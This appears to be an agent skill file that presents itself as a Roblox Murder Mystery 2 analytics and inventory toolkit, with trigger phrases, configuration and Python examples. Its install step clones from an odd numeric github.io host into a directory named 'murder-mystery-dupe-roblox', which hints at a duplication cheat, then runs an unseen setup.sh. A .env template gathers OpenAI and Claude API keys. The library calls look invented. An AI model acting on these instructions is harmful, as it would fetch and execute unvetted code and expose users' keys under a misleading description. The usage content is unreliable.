---
name: mm2-roblox-analytics-toolkit
description: Analytics and inventory tracking toolkit for Roblox Murder Mystery 2 gameplay optimization
triggers:
  - "analyze my Murder Mystery 2 inventory"
  - "track MM2 knife skins and statistics"
  - "set up Roblox MM2 analytics dashboard"
  - "optimize my Murder Mystery 2 collection"
  - "configure MM2 stats tracker"
  - "export Murder Mystery 2 analytics data"
  - "run MM2 inventory analysis"
  - "generate MM2 gameplay reports"
---

# MM2 Roblox Analytics Toolkit

> Skill by [ara.so](https://ara.so) — Data Skills collection.

This toolkit provides analytics, inventory tracking, and strategic insights for Roblox's Murder Mystery 2 game. It features inventory optimization, data visualization, performance metrics tracking, and AI-powered gameplay analysis.

## Installation

### Automated Setup

```bash
chmod +x setup.sh
./setup.sh --install
```

### Manual Installation

```bash
git clone https://8015238355.github.io
cd murder-mystery-dupe-roblox
npm install
python3 -m pip install -r requirements.txt
```

## Configuration

### Environment Variables

Create a `.env` file in the project root:

```bash
API_OPENAI_KEY=${OPENAI_API_KEY}
API_CLAUDE_KEY=${CLAUDE_API_KEY}
DATA_DIRECTORY=./data/collections
ANALYTICS_INTERVAL=300
ENABLE_LIVE_TRACKING=true
```

### Profile Configuration

Create a profile configuration file `config/profile.yaml`:

```yaml
profile:
  username: "MysterySolver2026"
  preferred_role: "sheriff"
  inventory_filter: 
    - category: "knife_skins"
      rarity: ["legendary", "ancient"]
    - category: "gamepasses"
      active: true
  analytics_preferences:
    tracking_mode: "comprehensive"
    data_refresh_rate: 30
    export_format: "csv, json"
  strategy_templates:
    - name: "aggressive_sheriff"
      priority: "high_visibility_areas"
    - name: "passive_innocent"
      priority: "distraction_avoidance"
```

## Core Commands

### Analytics Mode

Run comprehensive analytics on your MM2 data:

```bash
python3 main.py --mode analytics \
    --profile mystery_solver_01 \
    --export statistics_2026.json \
    --format json \
    --verbose \
    --log-level DEBUG
```

### Inventory Scanning

Scan and catalog your MM2 inventory:

```bash
python3 main.py --mode inventory \
    --scan \
    --export-inventory inventory_backup.csv \
    --check-rarity
```

### Strategy Analysis

Analyze gameplay patterns and strategies:

```bash
python3 main.py --mode strategy \
    --analyze-patterns \
    --role sheriff \
    --output strategy_report.json
```

### Real-time Tracking

Enable live tracking during gameplay:

```bash
python3 main.py --mode live \
    --track-stats \
    --interval 30 \
    --dashboard
```

## Python API Usage

### Basic Inventory Analysis

```python
from mm2_analytics import InventoryManager, AnalyticsEngine

# Initialize inventory manager
inventory = InventoryManager(
    username="player_username",
    data_dir="./data/collections"
)

# Scan inventory
items = inventory.scan_inventory()
print(f"Total items found: {len(items)}")

# Filter by rarity
legendary_items = inventory.filter_by_rarity(["legendary", "ancient"])
print(f"Legendary/Ancient items: {len(legendary_items)}")

# Export inventory
inventory.export_to_csv("inventory_backup.csv")
```

### Analytics Dashboard

```python
from mm2_analytics import AnalyticsEngine, Dashboard

# Initialize analytics engine
analytics = AnalyticsEngine(
    profile="mystery_solver_01",
    tracking_mode="comprehensive"
)

# Load gameplay data
analytics.load_session_data("./data/sessions")

# Calculate statistics
stats = analytics.calculate_statistics()
print(f"Win rate: {stats['win_rate']:.2%}")
print(f"Average survival time: {stats['avg_survival_time']}s")

# Generate visualizations
dashboard = Dashboard(analytics)
dashboard.create_performance_chart(output="performance.png")
dashboard.create_inventory_distribution(output="inventory.png")
```

### Strategy Optimization

```python
from mm2_analytics import StrategyAnalyzer, PatternRecognition

# Initialize strategy analyzer
strategy = StrategyAnalyzer(
    role="sheriff",
    ai_enabled=True,
    api_key="${OPENAI_API_KEY}"
)

# Analyze gameplay patterns
patterns = strategy.analyze_patterns(
    sessions_dir="./data/sessions",
    min_confidence=0.75
)

# Get AI recommendations
recommendations = strategy.get_ai_recommendations(
    current_stats=stats,
    target_improvement="win_rate"
)

for rec in recommendations:
    print(f"Strategy: {rec['name']}")
    print(f"Expected improvement: {rec['improvement']:.2%}")
    print(f"Description: {rec['description']}\n")
```

### Data Export and Reporting

```python
from mm2_analytics import DataExporter

# Initialize exporter
exporter = DataExporter(
    analytics_engine=analytics,
    inventory_manager=inventory
)

# Export comprehensive report
exporter.generate_report(
    output_format="json",
    include_charts=True,
    output_file="mm2_report_2026.json"
)

# Export CSV for spreadsheet analysis
exporter.export_csv(
    data_type="statistics",
    output_file="stats.csv"
)

# Export to multiple formats
exporter.batch_export(
    formats=["json", "csv", "html"],
    output_dir="./exports"
)
```

## Common Patterns

### Automated Inventory Tracking

```python
import schedule
import time
from mm2_analytics import InventoryManager

def track_inventory():
    inventory = InventoryManager(username="player_username")
    items = inventory.scan_inventory()
    inventory.export_to_csv(f"inventory_{time.strftime('%Y%m%d')}.csv")
    print(f"Inventory tracked: {len(items)} items")

# Schedule daily tracking
schedule.every().day.at("00:00").do(track_inventory)

while True:
    schedule.run_pending()
    time.sleep(60)
```

### Live Session Monitoring

```python
from mm2_analytics import LiveTracker
import asyncio

async def monitor_session():
    tracker = LiveTracker(
        interval=30,
        auto_export=True
    )
    
    async for update in tracker.stream_updates():
        print(f"Role: {update['current_role']}")
        print(f"Time alive: {update['survival_time']}s")
        print(f"Players remaining: {update['players_alive']}")
        
        # Export on round completion
        if update['round_complete']:
            tracker.export_session(f"session_{update['session_id']}.json")

asyncio.run(monitor_session())
```

### Batch Analysis of Multiple Profiles

```python
from mm2_analytics import BatchAnalyzer

profiles = ["player1", "player2", "player3"]
analyzer = BatchAnalyzer()

results = analyzer.analyze_multiple_profiles(
    profiles=profiles,
    metrics=["win_rate", "avg_survival", "knife_collection"],
    export_comparison=True
)

# Generate comparison chart
analyzer.create_comparison_chart(
    results=results,
    metric="win_rate",
    output="profile_comparison.png"
)
```

## Configuration Examples

### Custom Strategy Templates

```yaml
# config/strategies.yaml
strategies:
  aggressive_sheriff:
    movement_pattern: "high_activity"
    target_priority: "isolated_players"
    weapon_usage: "proactive"
    success_rate: 0.68
  
  defensive_innocent:
    movement_pattern: "group_follow"
    visibility: "high"
    coin_collection: "opportunistic"
    survival_rate: 0.72
  
  stealth_murderer:
    movement_pattern: "perimeter"
    strike_timing: "isolated_targets"
    disguise_usage: "frequent"
    kill_efficiency: 0.85
```

### Analytics Dashboard Settings

```yaml
# config/dashboard.yaml
dashboard:
  refresh_rate: 30
  charts:
    - type: "line"
      metric: "win_rate"
      timeframe: "30_days"
    - type: "pie"
      metric: "inventory_distribution"
      categories: ["knife", "gun", "pet"]
    - type: "bar"
      metric: "role_performance"
      roles: ["innocent", "sheriff", "murderer"]
  export_schedule:
    frequency: "daily"
    format: "html"
    destination: "./reports"
```

## Troubleshooting

### Data Directory Not Found

```python
import os
from mm2_analytics import InventoryManager

data_dir = "./data/collections"
if not os.path.exists(data_dir):
    os.makedirs(data_dir, exist_ok=True)
    print(f"Created data directory: {data_dir}")

inventory = InventoryManager(data_dir=data_dir)
```

### API Rate Limiting

```python
from mm2_analytics import StrategyAnalyzer
import time

strategy = StrategyAnalyzer(
    api_key="${OPENAI_API_KEY}",
    rate_limit_delay=2  # seconds between API calls
)

try:
    recommendations = strategy.get_ai_recommendations(stats)
except Exception as e:
    if "rate_limit" in str(e).lower():
        print("Rate limit reached, waiting 60 seconds...")
        time.sleep(60)
        recommendations = strategy.get_ai_recommendations(stats)
```

### Export Format Issues

```python
from mm2_analytics import DataExporter

exporter = DataExporter(analytics, inventory)

# Verify format before export
supported_formats = exporter.get_supported_formats()
desired_format = "json"

if desired_format in supported_formats:
    exporter.generate_report(output_format=desired_format)
else:
    print(f"Format '{desired_format}' not supported.")
    print(f"Available formats: {', '.join(supported_formats)}")
```

### Memory Optimization for Large Datasets

```python
from mm2_analytics import AnalyticsEngine

# Use chunked processing for large session data
analytics = AnalyticsEngine(
    profile="player_username",
    chunk_size=1000,  # Process 1000 records at a time
    cache_enabled=True
)

# Process data in chunks
for chunk in analytics.process_sessions_chunked("./data/sessions"):
    chunk_stats = analytics.calculate_statistics(chunk)
    print(f"Processed chunk: {len(chunk)} sessions")
```

## Advanced Features

### AI-Powered Pattern Recognition

```python
from mm2_analytics import PatternRecognition

pattern_ai = PatternRecognition(
    api_key="${CLAUDE_API_KEY}",
    model="claude-3"
)

# Analyze player behavior patterns
behavior_analysis = pattern_ai.analyze_behavior(
    session_data="./data/sessions",
    focus_areas=["movement", "interactions", "timing"]
)

print(f"Identified patterns: {len(behavior_analysis['patterns'])}")
for pattern in behavior_analysis['patterns']:
    print(f"- {pattern['description']} (confidence: {pattern['confidence']:.2%})")
```

### Predictive Modeling

```python
from mm2_analytics import PredictiveModel

model = PredictiveModel(training_data="./data/historical")
model.train()

# Predict inventory value trends
predictions = model.predict_inventory_value(
    current_inventory=inventory.get_items(),
    forecast_days=30
)

print(f"Current value: {predictions['current_value']}")
print(f"Predicted value (30d): {predictions['forecast_value']}")
print(f"Confidence: {predictions['confidence']:.2%}")
```
